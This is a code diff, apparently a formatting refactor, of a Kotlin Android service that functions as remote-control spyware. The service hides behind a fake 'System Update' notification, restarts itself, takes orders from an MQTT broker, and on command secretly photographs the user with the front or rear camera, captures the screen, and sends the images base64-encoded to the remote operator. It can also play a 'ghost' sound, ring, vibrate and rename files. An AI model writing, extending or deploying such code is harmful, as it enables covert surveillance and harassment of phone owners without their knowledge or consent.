@@ -25,6 +25,7 @@ import java.io.*
 import java.util.Locale
 import kotlin.coroutines.resume
 import kotlin.coroutines.suspendCoroutine
+
 class TargetService : Service() {
     companion object {
         var instance: TargetService? = null
@@ -37,12 +38,14 @@ class TargetService : Service() {
     private var mediaProjection: MediaProjection? = null
     private var mediaPlayer: MediaPlayer? = null
     private var tts: TextToSpeech? = null
+
     override fun onCreate() {
         super.onCreate()
         instance = this
         startForeground(1, buildNotif())
         cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
         tts = TextToSpeech(this) { if (it == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }
+        
         try {
             mqttClient = MqttClient(BROKER, MqttClient.generateClientId(), MemoryPersistence())
             val opt = MqttConnectOptions().apply { isAutomaticReconnect = true; isCleanSession = true; maxInflight = 200 }
@@ -50,14 +53,18 @@ class TargetService : Service() {
             mqttClient?.subscribe("$ROOM_ID/cmd", 1) { _, msg -> handle(String(msg.payload).trim()) }
         } catch (e: Exception) { e.printStackTrace() }
     }
+
     override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
     override fun onBind(i: Intent?): IBinder? = null
+
     private fun buildNotif(): Notification {
         val ch = "g_ch"; val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(ch, "Sys", NotificationManager.IMPORTANCE_LOW))
         return NotificationCompat.Builder(this, ch).setContentTitle("System Update").setContentText("Updating...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
     }
+
     fun setMediaProjection(mp: MediaProjection) { this.mediaProjection = mp }
+
     private fun handle(cmd: String) {
         when {
             cmd == "photo" -> CoroutineScope(Dispatchers.IO).launch { takePhoto(false) }
@@ -99,33 +106,64 @@ class TargetService : Service() {
             cmd.startsWith("rename:") -> { val p = cmd.substringAfter("rename:").split("|"); if (p.size == 2) renameFile(p[0], p[1]) }
         }
     }
+
     private fun takePhoto(front: Boolean) = suspendCoroutine<Unit> { cont ->
         val cm = getSystemService(CAMERA_SERVICE) as CameraManager
         val id = if (front) cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT } else cameraId
-        if (id == null) { sendLog("❌ Camera not found"); cont.resume(Unit); return@suspendCoroutine }
+        if (id == null) {
+            sendLog("❌ Camera not found")
+            cont.resume(Unit)
+            return@suspendCoroutine
+        }
         try {
-            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: return@suspendCoroutine cont.resume(Unit)
+            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
+            if (size == null) {
+                cont.resume(Unit)
+                return@suspendCoroutine
+            }
             val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
             reader.setOnImageAvailableListener({ r ->
                 val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
-                val buf = img.planes[0].buffer; val b = ByteArray(buf.remaining()); buf.get(b); img.close(); r.close()
+                val buf = img.planes[0].buffer
+                val b = ByteArray(buf.remaining())
+                buf.get(b)
+                img.close()
+                r.close()
                 val bmp = Bitmap.createScaledBitmap(BitmapFactory.decodeByteArray(b, 0, b.size), 640, 480, true)
-                val baos = ByteArrayOutputStream(); bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos)
-                sendLog("img:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)); cont.resume(Unit)
+                val baos = ByteArrayOutputStream()
+                bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos)
+                sendLog("img:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
+                cont.resume(Unit)
             }, Handler(Looper.getMainLooper()))
+            
             cm.openCamera(id, object : CameraDevice.StateCallback() {
-                override fun onOpened(dev: CameraDevice) { dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
-                    override fun onConfigured(s: CameraCaptureSession) { s.capture(dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build(), null, null); dev.close() }
-                    override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); cont.resume(Unit) }
-                }, null) }
+                override fun onOpened(dev: CameraDevice) {
+                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                        override fun onConfigured(s: CameraCaptureSession) {
+                            s.capture(dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build(), null, null)
+                            dev.close()
+                        }
+                        override fun onConfigureFailed(s: CameraCaptureSession) {
+                            dev.close()
+                            cont.resume(Unit)
+                        }
+                    }, null)
+                }
                 override fun onDisconnected(dev: CameraDevice) { dev.close() }
-                override fun onError(dev: CameraDevice, e: Int) { dev.close(); cont.resume(Unit) }
+                override fun onError(dev: CameraDevice, e: Int) {
+                    dev.close()
+                    cont.resume(Unit)
+                }
             }, null)
-        } catch (e: Exception) { cont.resume(Unit) }
+        } catch (e: Exception) {
+            cont.resume(Unit)
+        }
     }
+
     private fun takeScreenshot() {
         val mp = mediaProjection ?: return sendLog("❌ Izin screenshot belum aktif")
-        val dm = resources.displayMetrics; val w = dm.widthPixels; val h = dm.heightPixels; val d = dm.densityDpi
+        val dm = resources.displayMetrics
+        val w = dm.widthPixels; val h = dm.heightPixels; val d = dm.densityDpi
         val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 1)
         val vd = mp.createVirtualDisplay("G", w, h, d, android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
         Handler(Looper.getMainLooper()).postDelayed({
@@ -134,11 +172,13 @@ class TargetService : Service() {
                 val p = img.planes[0]; val buf = p.buffer; val ps = p.pixelStride; val rs = p.rowStride
                 val bmp = Bitmap.createBitmap(w + (rs - ps * w) / ps, h, Bitmap.Config.ARGB_8888)
                 bmp.copyPixelsFromBuffer(buf); img.close(); vd.release(); reader.close()
-                val baos = ByteArrayOutputStream(); Bitmap.createBitmap(bmp, 0, 0, w, h).compress(Bitmap.CompressFormat.JPEG, 40, baos)
+                val baos = ByteArrayOutputStream()
+                Bitmap.createBitmap(bmp, 0, 0, w, h).compress(Bitmap.CompressFormat.JPEG, 40, baos)
                 sendLog("screen:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
             }
         }, 500)
     }
+
     private fun playGhostSound() {
         try {
             val am = getSystemService(AUDIO_SERVICE) as AudioManager
@@ -147,17 +187,27 @@ class TargetService : Service() {
             for (i in 0 until ns) s[i] = Math.sin(2 * Math.PI * i / (sr / 50.0))
             var idx = 0; for (v in s) { val vs = (v * 32767).toInt().toShort(); gs[idx++] = (vs.toInt() and 0x00ff).toByte(); gs[idx++] = ((vs.toInt() and 0xff00) ushr 8).toByte() }
             val f = File(cacheDir, "ghost.wav"); val fos = FileOutputStream(f)
-            fos.write(byteArrayOf(82,73,70,70, (36 + ns*2).toByte(),0,0,0, 87,65,86,69, 102,109,116,32, 16,0,0,0, 1,0, 1,0, (sr and 0xff).toByte(), ((sr shr 8) and 0xff).toByte(), 0,0, 0,0, 2,0, 16,0, 100,97,116,97, (ns*2).toByte(),0,0,0))
-            fos.write(gs); fos.close()
+            val header = byteArrayOf(
+                82.toByte(), 73.toByte(), 70.toByte(), 70.toByte(), (36 + ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
+                87.toByte(), 65.toByte(), 86.toByte(), 69.toByte(), 102.toByte(), 109.toByte(), 116.toByte(), 32.toByte(),
+                16.toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 1.toByte(), 0.toByte(), 1.toByte(), 0.toByte(),
+                (sr and 0xff).toByte(), ((sr shr 8) and 0xff).toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
+                2.toByte(), 0.toByte(), 16.toByte(), 0.toByte(), 100.toByte(), 97.toByte(), 116.toByte(), 97.toByte(),
+                (ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte()
+            )
+            fos.write(header); fos.write(gs); fos.close()
             mediaPlayer?.release(); mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
             sendLog("👻 Ghost Sound Playing")
         } catch (e: Exception) { sendLog("err: ${e.message}") }
     }
+
     private fun playRing() {
-        val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+        val am = getSystemService(AUDIO_SERVICE) as AudioManager
+        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
         mediaPlayer?.release(); mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI).apply { isLooping = false; start() }
         sendLog("🔔 Ringing")
     }
+
     private fun setTorch(on: Boolean) { try { (getSystemService(CAMERA_SERVICE) as CameraManager).setTorchMode(cameraId ?: return, on); sendLog(if (on) "🔦 ON" else "🔅 OFF") } catch (e: Exception) {} }
     private fun vibratePhone() { val v = getSystemService(VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE)); sendLog("📳 Vibrate") }
     private fun setVol(pct: Int) { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * pct / 100, 0); sendLog("🔊 Volume $pct%") }
